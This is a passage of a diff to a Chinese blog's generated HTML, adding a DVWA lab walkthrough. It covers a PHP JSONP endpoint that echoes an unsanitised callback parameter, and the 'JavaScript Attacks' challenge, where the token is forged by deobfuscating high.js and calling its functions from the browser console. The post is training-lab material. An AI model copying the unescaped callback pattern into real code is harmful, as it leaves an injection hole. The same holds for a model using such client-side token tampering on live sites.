+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;callback&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">  <span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$outp</span> = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span> . <span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$outp</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="javascript-attacks"><a class="markdownIt-Anchor" href="#javascript-attacks"></a> JavaScript Attacks</h1>
+<p>easy 难度看源码，js 脚本直接在页面源码里，照<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/103168248">Js 攻略</a>这里改就行了，然后补充一点，浏览器执行 js 脚本直接 F12 控制台，输入函数名<code>generate_token()</code>即可。
+中等难度，js 不在前端，但可以得到 js 代码地址 ：<code>yourip/dvwa/vulnerabilities/javascript/source/medium.js</code>，直接访问可以看到生成 token 的函数叫<code>do_elsesomething(&quot;XX&quot;)</code>，改完 value 后控制台跑一遍即可。
+发现<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13739003.html">DVWA 通关指南：JavaScript Attacks (前端攻击)</a>这里讲的更好。
+根据上一步的方法查看 high.js 的内容，确实是一团乱码，根据<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/#">js 混淆还原工具 </a>可以得到 js 代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">  <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> + y</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">sha256</span>(</span><br><span class="line">    e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">token_part_1</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>);</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
+<p>这段代码的大致意思是 300ms 后执行 token_part_2，增加点击事件 token_part_3，执行 token_part_1
+实际上的执行顺序是 token_part_1，token_part_2，token_part_3，但因为 token_part_3 会在点击之后自动执行，所以只需要修改 value 后，依次执行<code>token_part_1(&quot;ABCD&quot;, 44)</code>和<code>token_part_2(&quot;XX&quot;)</code></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -482,7 +752,7 @@ DVWA-&gt;config-&gt;config.inc.php.dist 文件，修改后缀名为 ini.php。
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -493,13 +763,13 @@ DVWA-&gt;config-&gt;config.inc.php.dist 文件，修改后缀名为 ini.php。
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">22k</span>
+    <span title="站点总字数">24k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:22</span>
+    <span title="站点阅读时长">1:27</span>
   </span>
 </div>
 <div class="busuanzi-count">
